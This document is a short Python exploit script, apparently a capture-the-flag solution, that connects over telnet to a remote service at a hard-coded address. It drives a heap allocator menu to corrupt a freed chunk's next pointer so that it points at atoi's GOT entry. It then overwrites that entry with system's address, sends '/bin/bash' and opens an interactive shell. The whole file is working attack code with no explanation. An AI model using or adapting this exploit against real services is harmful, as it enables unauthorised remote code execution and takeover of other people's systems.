#lazy sploit ;P
import telnetlib
from struct import pack,unpack

#HOST="localhost"
#port = 1337
HOST="89.38.210.128"
port=1339
atoi_got = 0x602068

def p(data) :
        return pack("<Q",data)

def up(data) :
        return unpack("<Q",data)
		
t = telnetlib.Telnet(HOST,port)
print t.read_until(">")
t.write("1\n")
print t.read_until(">")
t.write("2\n")
t.write("X\n")
print t.read_until(">")
t.write("1\n")
print t.read_until(">")
t.write("2\n")
t.write("A"*6+"\n")
print t.read_until(">")
#pop and abuse next free chunk pointer to point to atoi@got
t.write("4\n")
print t.read_until(">")
t.write("4\n")
print t.read_until(">")
t.write("3\n")
print  t.read_until(">")
#print ret
#ret =  ret.split("Allocate")[0].strip()
#print hex(up(ret.ljust(8, "\x00"))[0])
t.write("2\n")
t.write(p(atoi_got)+"\n")
print t.read_until(">")
t.write("1\n")
print t.read_until(">")
t.write("2\n")
t.write("C"*3+"\n")
print t.read_until(">")
t.write("1\n")
print t.read_until(">")
t.write("2\n")
#overwrite atoi with system and get a shell
t.write(p(0x400710))
print t.read_until(">")
t.write("/bin/bash\x00")
#print t.read_until(">")
t.interact()
